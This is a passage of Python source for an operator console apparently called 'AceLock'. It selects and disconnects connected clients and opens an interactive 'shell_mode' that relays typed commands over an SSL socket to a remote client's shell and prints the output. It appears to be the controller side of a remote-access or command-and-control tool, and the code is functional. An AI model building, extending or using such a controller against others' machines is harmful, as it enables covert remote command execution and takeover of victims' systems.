            print(f"[*] Requesting server disconnect client: {ip}:{port}...")
            disconnected = self.server_object.disconnect_client(target_address)

            if disconnected:
                print(f"[+] Server reported client {ip}:{port} disconnected.")
                logging.info(f"Client {ip}:{port} disconnected via server method.")
                # Check if this was the currently selected client
                if self.current_client_address == target_address:
                    print("[*] Current client selection cleared.")
                    self._clear_current_client() # Use helper
            else:
                 print(f"[!] Server failed to disconnect client {ip}:{port} (may already be disconnected).")
                 logging.warning(f"Server call disconnect_client failed for {ip}:{port}")

        except (ValueError, IndexError, argparse.ArgumentError) as e:
             logging.error(f"Argument error in disconnect_client: {e}")
             print(f"[!] Error processing arguments: {e}")
        except AttributeError as e:
             logging.error(f"Missing disconnect_client method on server object: {e}")
             print(f"[!] Server object error: {e}. Is server.py correct?")
        except Exception as e:
            logging.error(f"Error disconnecting client: {e}", exc_info=True)
            print(f"[!] Error disconnecting client: {e}")


    def do_stop_server(self, args):
        """
        Stop the server using its stop() method.
        Usage: stop_server
        """
        # <<-- No major change needed, already calls server's stop() -->>
        with self._lock:
            if not self.server_running:
                logging.warning("stop_server attempted while server not running.")
                print("[!] Server is not running.")
                return

        try:
            logging.info("Stopping server via command...")
            print("[*] Stopping server...")
            if self.server_object:
                self.server_object.stop() # Uses the server's stop method
                logging.info("Server object stop() method called.")

            # State update handled by _run_server finally block, but set here for responsiveness
            with self._lock:
                self.server_running = False

            print("[+] Server stop request processed.")
            self._clear_current_client() # Clear selection

        except AttributeError as e:
             logging.error(f"Missing stop method on server object: {e}")
             print(f"[!] Server object error: {e}. Is server.py correct?")
        except Exception as e:
            logging.error(f"Error stopping server: {e}", exc_info=True)
            print(f"[!] Error stopping server: {e}")
            with self._lock: # Ensure state is False on error too
                 self.server_running = False
            self._clear_current_client()


    def do_shell_mode(self, args):
        """
        Enter interactive shell mode with the selected client via DIRECT socket access.
        Type 'exit' or 'quit' within the shell to return here.
        Usage: shell_mode
        """
        # <<-- MAJOR CHANGES HERE (similar to do_cmd) -->>
        if not self.server_running or not self.server_object:
            logging.warning("shell_mode attempted while server not running.")
            print("[!] Server not running. Use start_server first.")
            return

        if not self.current_client_socket or not self.current_client_address:
            print("[!] No client selected. Use select_client first.")
            return

        # Verify the selected client is still connected using getter
        try:
            clients_data = self.server_object.get_clients()
            if self.current_client_address not in clients_data:
                 print("[!] Current client seems to have disconnected. Select another client.")
                 self._clear_current_client()
                 return
            # Refresh socket object
            self.current_client_socket = clients_data[self.current_client_address][0]
        except AttributeError:
            print("[!] Error accessing server's client getter for verification.")
            return

        ip, port = self.current_client_address
        logging.info(f"Entering direct shell mode with client {ip}:{port}")
        print(f"[*] Entering interactive shell with {ip}:{port}...")
        print("[*] Type 'exit' or 'quit' to return to AceLock shell.")

        original_prompt = self.prompt
        shell_prompt = f"{ip}:{port}> "

        try:
            # Send SHELL_START command to client to initiate shell mode <<-- Added
            try:
                start_cmd = "SHELL_START\n"
                self.current_client_socket.sendall(start_cmd.encode('utf-8'))
                logging.info(f"Sent SHELL_START to {ip}:{port}")
            except (socket.error, ssl.SSLError, BrokenPipeError) as e:
                 print(f"[!] Failed to send SHELL_START indicator: {e}")
                 logging.error(f"Socket error sending SHELL_START to {ip}:{port}: {e}")
                 self._handle_disconnection(self.current_client_address)
                 return # Cannot start shell mode

            while True: # Main loop for sending/receiving shell data
                try:
                    shell_input = input(shell_prompt)

                    if not shell_input.strip(): continue

                    if shell_input.lower() in ["exit", "quit"]:
                        logging.info(f"Exiting shell mode for {ip}:{port} by user command.")
                        # Send exit command to client (client's shell_session handles Popen exit)
                        try:
                             # Send exactly what user typed + newline
                             self.current_client_socket.sendall((shell_input + "\n").encode('utf-8'))
                             sleep(0.1) # Give client a moment
                        except (socket.error, ssl.SSLError, BrokenPipeError) as sock_err:
                             logging.warning(f"Socket error sending 'exit' to {ip}:{port}: {sock_err}. Assuming disconnect.")
                             self._handle_disconnection(self.current_client_address)
                        print("[+] Exiting shell mode.")
                        break # Exit the shell_mode loop

                    # Send the command directly via the socket + newline
                    self.current_client_socket.sendall((shell_input + "\n").encode('utf-8'))

                    # Receive and display output using helper
                    # Use a shorter timeout? Or rely on client sending promptly.
                    output = self._receive_all(self.current_client_socket, timeout=1.0) # Shorter timeout for interactive feel
                    if output:
                         print(output.decode('utf-8', errors='replace'), end='')
                         if not output.endswith(b'\n') and not output.endswith(b'\r'):
                              print() # Ensure prompt on new line
                    # else: timeout is expected if command gives no immediate output

                except KeyboardInterrupt:
                    print("\n[!] Interrupt received. Sending newline (Ctrl+C). Type 'exit' or 'quit' to leave.")
                    try:
                        self.current_client_socket.sendall(b'\n')
                    except (socket.error, ssl.SSLError, BrokenPipeError) as sock_err:
                         logging.warning(f"Socket error sending newline on interrupt: {sock_err}")
                         self._handle_disconnection(self.current_client_address)
                         break
                    continue

                except ConnectionResetError:
                     # Handled by _receive_all or _handle_disconnection called within it
                     logging.warning(f"Connection reset during shell mode for {ip}:{port}.")
                     break # Exit shell mode loop
                except (socket.error, ssl.SSLError, BrokenPipeError) as e:
                    print(f"\n[!] Connection error with client {ip}:{port}: {e}")
                    logging.error(f"Socket error during shell mode with {ip}:{port}: {e}", exc_info=True)
                    self._handle_disconnection(self.current_client_address)
                    break
                except Exception as e: # Catch unexpected errors in loop
                     print(f"\n[!] Unexpected error in shell input/output loop: {e}")
                     logging.error(f"Unexpected error in shell loop for {ip}:{port}: {e}", exc_info=True)
                     self._handle_disconnection(self.current_client_address)
                     break

        except Exception as e: # Catch errors during initial SHELL_START send
            print(f"[!] Unexpected error initiating shell mode: {e}")
            logging.error(f"Unexpected error initiating shell_mode for {ip}:{port}: {e}", exc_info=True)
            if self.current_client_address:
                 self._handle_disconnection(self.current_client_address)
        finally:
            self.prompt = original_prompt # Restore prompt
            logging.info(f"Exited shell mode routine for {ip}:{port}")


    def do_exit(self, args):
        """
        Stop the server (if running) and exit the command shell.
        Usage: exit | quit | EOF
        """
        print("[*] Exiting AceLock...")
        logging.info("Exit command received.")
        if self.server_running:
             self.do_stop_server(args)
        return True  # Exit cmd loop

    # --- Helper Methods (Keep from previous refined version) ---

    def _receive_all(self, sock, timeout=2.0):
        """Helper to receive data from a socket until timeout or close."""
        if not sock or sock._closed: # Check if socket is closed
             logging.warning("_receive_all called with closed or invalid socket.")
             if self.current_client_address: # If we know which client it was
                 self._handle_disconnection(self.current_client_address)
             return b''
        if not isinstance(sock, socket.socket):
             logging.error("_receive_all called with non-socket object.")
             return b''

        sock.settimeout(timeout)
        total_data = b''
        try:
            while True:
                chunk = sock.recv(4096)
                if chunk:
                    total_data += chunk
                else:
                    # Socket closed gracefully by peer
                    logging.info(f"Socket recv returned empty, peer {sock.getpeername() if not sock._closed else '(closed)'} likely closed connection.")
                    raise ConnectionResetError("Peer closed connection")
        except socket.timeout:
            logging.debug(f"Socket timeout after receiving {len(total_data)} bytes.")
            pass # Expected behavior when no more data arrives
        except ConnectionResetError as e:
             logging.warning(f"ConnectionResetError during _receive_all: {e}")
             if self.current_client_address: self._handle_disconnection(self.current_client_address)
             raise # Re-raise so caller knows connection is gone
        except (socket.error, ssl.SSLError, OSError) as e:
             # Check for specific "closed" errors vs other errors
             if sock._closed or "closed" in str(e).lower() or "broken pipe" in str(e).lower():
                  logging.warning(f"Socket error indicates closed connection during _receive_all: {e}")
                  if self.current_client_address: self._handle_disconnection(self.current_client_address)
                  raise ConnectionResetError(f"Socket closed: {e}") # Treat as disconnect
             else:
                  logging.error(f"Socket error during _receive_all: {e}")
                  if self.current_client_address: self._handle_disconnection(self.current_client_address)
                  raise ConnectionResetError(f"Socket error likely indicates disconnect: {e}")
        finally:
            try:
                 if not sock._closed: sock.settimeout(None) # Reset only if still open
            except (socket.error, OSError): pass
        return total_data

    def _clear_current_client(self):
        """Clears the current client selection and resets the prompt."""
        if self.current_client_address or self.current_client_socket:
            self.current_client_socket = None
            self.current_client_address = None
            self.prompt = 'AceLock> '
            logging.info("Current client selection cleared.")

    def _handle_disconnection(self, client_address):
        """Handles cleaning up state when a client disconnects or errors occur."""
        if not client_address: return

        ip, port = client_address
        print(f"\n[*] Handling apparent disconnection for client {ip}:{port}.")
        logging.warning(f"Handling disconnection/error for {ip}:{port}")

        # Attempt removal via the server's safe method <<-- Changed
        if self.server_object:
            logging.info(f"Requesting server disconnect client {ip}:{port} due to error/disconnect.")
            self.server_object.disconnect_client(client_address) # Server handles actual close/removal

        # Clear selection if this was the current client
        if self.current_client_address == client_address:
            self._clear_current_client()



    # --- Command Aliases ---
    do_quit = do_exit
    do_EOF = do_exit # Handle Ctrl+D

# ============================================================================
